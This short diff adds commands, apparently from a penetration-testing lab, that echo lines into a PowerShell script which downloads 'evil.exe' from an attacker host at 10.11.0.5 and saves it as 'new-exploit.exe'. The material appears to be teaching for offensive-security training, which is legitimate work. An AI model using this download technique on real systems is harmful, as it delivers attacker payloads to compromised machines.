@@ -1,0 +1,5 @@
+C:\Users\Offsec> echo $storageDir = $pwd > wget.ps1
+C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+C:\Users\Offsec> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
+C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
+C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
